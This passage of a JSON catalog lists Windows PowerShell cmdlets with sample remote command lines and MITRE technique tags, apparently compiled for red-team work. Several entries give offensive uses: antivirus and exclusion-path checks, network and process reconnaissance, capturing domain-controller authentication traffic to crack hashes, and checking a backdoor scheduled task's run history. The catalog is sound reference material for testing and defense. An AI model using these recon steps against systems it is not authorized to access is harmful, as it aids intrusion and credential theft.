"toolsets": ["CIMSession", "TODO"], "synopsis": "Gets an account that the DHCP Server service uses to register or deregister client records on a DNS server", "description": "TODO", "commandline": "Get-DhcpServerDnsCredential -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 203, "name": "Get-DhcpServerInDC", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Retrieves the list of authorized computers running the Dynamic Host Configuration Protocol (DHCP) server service from Active Directory (AD)", "description": "TODO", "commandline": "Get-DhcpServerInDC -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 204, "name": "Get-DhcpServerSetting", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets the configuration parameters of the database of the Dynamic Host Configuration Protocol (DHCP) server service", "description": "TODO", "commandline": "Get-DhcpServerSetting -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 205, "name": "Get-DhcpServerv4DnsSetting", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets the DNS settings configured on the Dynamic Host Configuration Protocol (DHCP) server service for a specific scope, reservation, or server level", "description": "TODO", "commandline": "Get-DhcpServerv4DnsSetting -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 206, "name": "Get-DhcpServerv4Filter", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets the list of all MAC addresses from the allow list or the deny list on the Dynamic Host Configuration Protocol (DHCP) server service", "description": "TODO", "commandline": "Get-DhcpServerv4Filter -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 207, "name": "Get-DhcpServerv4FilterList", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets the enabled state of the allow filter list and deny filter list set on the Dynamic Host Configuration Protocol (DHCP) server service", "description": "TODO", "commandline": "Get-DhcpServerv4FilterList -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 208, "name": "Get-DhcpServerv4Lease", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets one or more lease records from the Dynamic Host Configuration Protocol (DHCP) server service", "description": "TODO", "commandline": "Get-DhcpServerv4Lease -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 209, "name": "Get-Disk", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets one or more disks visible to the operating system", "description": "List disks", "commandline": "Get-Disk -CimSession $s", "usecases": ["Reconnaissance on disks"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 210, "name": "Get-DiskImage", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets one or more disk image objects (virtual hard disk or ISO)", "description": "TODO", "commandline": "Get-DiskImage -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 211, "name": "Get-DnsClientCache", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Retrieves the contents of the DNS client cache", "description": "List cached DNS entries", "commandline": "Get-DnsClientCache -CimSession $s", "usecases": ["Reconnaissance on the network/Internet activities on the computer"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsClient`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 212, "name": "Get-DnsClientNrptRule", "type": "Cmdlets", "function": "Network", "toolsets": ["CIMSession", "TODO"], "synopsis": "Retrieves the DNS client NRPT rules", "description": "TODO", "commandline": "Get-DnsClientNrptRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsClient`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 213, "name": "Get-DnsClientServerAddress", "type": "Cmdlets", "function": "Network", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets DNS server IP addresses from the TCP/IP properties on an interface", "description": "TODO", "commandline": "Get-DnsClientServerAddress -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsClient`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 214, "name": "Get-DnsServer", "type": "Cmdlets", "function": "Network", "toolsets": ["CIMSession", "RSAT"], "synopsis": "Retrieves a DNS server configuration", "description": "Show DNS server configuration", "commandline": "Get-DnsServer -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 215, "name": "Get-DnsServerCache", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Retrieves DNS server cache settings", "description": "TODO", "commandline": "Get-DnsServerCache -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 216, "name": "Get-DnsServerForwarder", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets forwarder configuration settings on a DNS server", "description": "TODO", "commandline": "Get-DnsServerForwarder -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 217, "name": "Get-EtwTraceProvider", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets ETW trace providers", "description": "TODO", "commandline": "Get-EtwTraceProvider -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `EventTracingManagement`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 218, "name": "Get-EtwTraceSession", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets ETW trace sessions", "description": "TODO", "commandline": "Get-EtwTraceSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `EventTracingManagement`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 219, "name": "Get-FileShare", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves file share objects and their properties", "description": "TODO", "commandline": "Get-FileShare -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 220, "name": "Get-GPO", "type": "Cmdlets", "function": "Domain", "toolsets": ["Builtin", "TODO"], "synopsis": "Gets one GPO or all the GPOs in a domain", "description": "TODO", "commandline": "Get-GPO", "usecases": [], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 221, "name": "Get-GPOReport", "type": "Cmdlets", "function": "Domain", "toolsets": ["Builtin", "RSAT", "TODO"], "synopsis": "Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain", "description": "Get report in HTML", "commandline": "Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Html -Path \"$pwd\\domain.html", "usecases": ["Information on group policies"], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 222, "name": "Get-GPOReport", "type": "Cmdlets", "function": "Domain", "toolsets": ["Builtin", "RSAT", "TODO"], "synopsis": "Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain", "description": "Get report in XML", "commandline": "Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Xml -Path \"$pwd\\domain.xml", "usecases": ["Information on group policies"], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 223, "name": "Get-GPOReport", "type": "Cmdlets", "function": "Domain", "toolsets": ["Builtin", "RSAT", "TODO"], "synopsis": "Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain", "description": "TODO", "commandline": "Get-GPOReport", "usecases": [], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 224, "name": "Get-GPPermission", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Gets the permission level for one or more security principals on a specified GPO", "description": "TODO", "commandline": "Get-GPPermission", "usecases": [], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 225, "name": "Get-GPResultantSetOfPolicy", "type": "Cmdlets", "function": "Domain", "toolsets": ["Builtin", "TODO"], "synopsis": "Gets and writes the RSoP information for a user, a computer, or both to a file", "description": "TODO", "commandline": "Get-GPResultantSetOfPolicy", "usecases": [], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 226, "name": "Get-GPStarterGPO", "type": "Cmdlets", "function": "Domain", "toolsets": ["Builtin", "TODO"], "synopsis": "Gets one Starter GPO or all Starter GPOs in a domain", "description": "TODO", "commandline": "Get-GPStarterGPO", "usecases": [], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 227, "name": "Get-HotFix", "type": "Cmdlets", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Gets the hotfixes that are installed on local or remote computers", "description": "List installed KBs", "commandline": "Get-HotFix -ComputerName W10.ad.bitsadmin.com", "usecases": ["Feed them to Windows Exploit Suggester - Next Generation to identify what vulnerabilities the system is vulnerable to"], "comments": "PowerShell Module: `Microsoft.PowerShell.Management`", "resources": ["https://blog.bitsadmin.com/windows-security-updates-for-hackers"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 228, "name": "Get-MpComputerStatus", "type": "Cmdlets", "function": "Recon", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the status of antimalware software on the computer", "description": "Check status of AV", "commandline": "Get-MpComputerStatus -CimSession $s", "usecases": ["Identify whether the AV is active"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 229, "name": "Get-MpPreference", "type": "Cmdlets", "function": "Recon", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets preferences for the Windows Defender scans and updates", "description": "Obtain the AV's configuration", "commandline": "Get-MpPreference -CimSession $s", "usecases": ["Identify whether the AV is active and which exclusion paths are configured"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 230, "name": "Get-MpThreat", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets the history of threats detected on the computer", "description": "TODO", "commandline": "Get-MpThreat -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 231, "name": "Get-MpThreatCatalog", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets known threats from the definitions catalog", "description": "TODO", "commandline": "Get-MpThreatCatalog -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 232, "name": "Get-MpThreatDetection", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets active and past malware threats that Windows Defender detected", "description": "TODO", "commandline": "Get-MpThreatDetection -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 233, "name": "Get-NetAdapter", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the basic network adapter properties", "description": "List adapters", "commandline": "Get-NetAdapter -Name * -CimSession $s", "usecases": ["Identify whether a machine is dual-homed"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetAdapter`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 234, "name": "Get-NetConnectionProfile", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets a connection profile", "description": "List active connection profiles", "commandline": "Get-NetConnectionProfile -CimSession $s", "usecases": ["Determine what connection profiles are active on the network interfaces"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetConnection`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 235, "name": "Get-NetEventSession", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets network event sessions", "description": "Get status of an event session", "commandline": "Get-NetEventSession -Name sess -CimSession $s", "usecases": ["Sniff authentication traffic on a domain controller and locally crack the hashes"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee all details in [New-NetEventSession](../New-NetEventSession)\nPowerShell Module: `NetEventPacketCapture`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 236, "name": "Get-NetFirewallRule", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves firewall rules from the target computer", "description": "TODO", "commandline": "Get-NetFirewallRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 237, "name": "Get-NetIPAddress", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the IP address configuration", "description": "List IP addresses of the various interfaces", "commandline": "Get-NetIPAddress -CimSession $s | Sort InterfaceIndex | ft -Autosize InterfaceIndex, InterfaceAlias, AddressFamily, IPAddress, PrefixLength", "usecases": ["Identify whether a machine might be dual-homed"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 238, "name": "Get-NetIPInterface", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets an IP interface", "description": "TODO", "commandline": "Get-NetIPInterface -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 239, "name": "Get-NetNat", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets NAT objects", "description": "TODO", "commandline": "Get-NetNat -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 240, "name": "Get-NetNatExternalAddress", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets external addresses configured for NAT instances", "description": "TODO", "commandline": "Get-NetNatExternalAddress -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 241, "name": "Get-NetNatGlobal", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves global settings for all NAT instances on a computer", "description": "TODO", "commandline": "Get-NetNatGlobal -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 242, "name": "Get-NetNatSession", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets all active NAT sessions", "description": "TODO", "commandline": "Get-NetNatSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 243, "name": "Get-NetNatStaticMapping", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets static mappings configured on NAT instances", "description": "TODO", "commandline": "Get-NetNatStaticMapping -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 244, "name": "Get-NetNeighbor", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets neighbor cache entries", "description": "List ARP entries", "commandline": "Get-NetNeighbor -CimSession $s | select InterfaceIndex,IPAddress,AddressFamily,LinkLayerAddress,State,InterfaceAlias | ft", "usecases": ["Identify which devices are in the same subnet"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 245, "name": "Get-NetRoute", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the IP route information from the IP routing table", "description": "List routing table", "commandline": "Get-NetRoute -CimSession $s", "usecases": ["Identify network routes"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 246, "name": "Get-NetTCPConnection", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets TCP connections", "description": "Enumerate listening TCP ports", "commandline": "Get-NetTCPConnection -CimSession $s -State Listen", "usecases": ["Recon on listening services"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 247, "name": "Get-NetTCPConnection", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets TCP connections", "description": "List established connections", "commandline": "Get-NetTCPConnection -CimSession $s -State Established", "usecases": ["Recon on current network and Internet activity"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 248, "name": "Get-NetUDPEndpoint", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets current UDP endpoint statistics", "description": "Enumerate listening UDP ports", "commandline": "Get-NetUDPEndpoint -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 249, "name": "Get-NfsSession", "type": "Cmdlets", "function": "Data", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets information about which client computers are currently connected to one or more shares on an NFS server", "description": "TODO", "commandline": "Get-NfsSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: NFS", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 250, "name": "Get-NfsShare", "type": "Cmdlets", "function": "Data", "toolsets": ["CIMSession", "TODO"], "synopsis": "Gets NFS shares on an NFS server", "description": "TODO", "commandline": "Get-NfsShare -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: NFS", "resources": [], "mitre_techniques": ["T1135", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 251, "name": "Get-OdbcDsn", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets ODBC DSNs", "description": "TODO", "commandline": "Get-OdbcDsn -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: Wdac", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 252, "name": "Get-Partition", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Returns a list of all partition objects visible on all disks, or optionally a filtered list using specified parameters", "description": "TODO", "commandline": "Get-Partition -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 253, "name": "Get-PhysicalDisk", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets a list of all PhysicalDisk objects visible across any available Storage Management Providers, or optionally a filtered list", "description": "TODO", "commandline": "Get-PhysicalDisk -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 254, "name": "Get-Printer", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves a list of printers installed on a computer", "description": "TODO", "commandline": "Get-Printer -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: PrintManagement", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 255, "name": "Get-Process", "type": "Cmdlets", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Gets the processes that are running on the local computer or a remote computer.", "description": "List processes", "commandline": "Get-Process -ComputerName DC1.ad.bitsadmin.com", "usecases": ["Reconnaissance on running processes"], "comments": "", "resources": [], "mitre_techniques": ["T1057"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 256, "name": "Get-RemoteAccess", "type": "Cmdlets", "function": "Processes", "toolsets": ["CIMSession", "TODO"], "synopsis": "Displays the configuration of DirectAccess (DA) and VPN (both Remote Access VPN and site-to-site VPN)", "description": "TODO", "commandline": "Get-RemoteAccess -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: RemoteAccess", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 257, "name": "Get-ScheduledTask", "type": "Cmdlets", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the task definition object of a scheduled task that is registered on the local computer", "description": "List details on scheduled tasks", "commandline": "Get-ScheduledTask -CimSession $s | % { [PSCustomObject]@{State=$_.State; TaskName=$_.TaskName; TaskPath=$_.TaskPath; Actions=$($a=$_.Actions;$($a.Id,$a.WorkingDirectory,$a.Execute,$a.Arguments).Where({$_ -ne $null}) -join \" \"); Author=$_.Author; Description=$_.Description; SecurityDescriptor=$_.SecurityDescriptor } }", "usecases": ["Reconnaissance"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `ScheduledTasks`", "resources": [], "mitre_techniques": ["T1053.005", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 258, "name": "Get-ScheduledTaskInfo", "type": "Cmdlets", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets run-time information for a scheduled task", "description": "List details on scheduled task execution", "commandline": "Get-ScheduledTaskInfo -CimSession $s -TaskName '\\Microsoft\\Windows\\DiskCleanup\\CleanupBackdoor'", "usecases": ["Determine past executions of implant"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `ScheduledTasks`", "resources": [], "mitre_techniques": ["T1053.005", "T1047"], "detections": "", 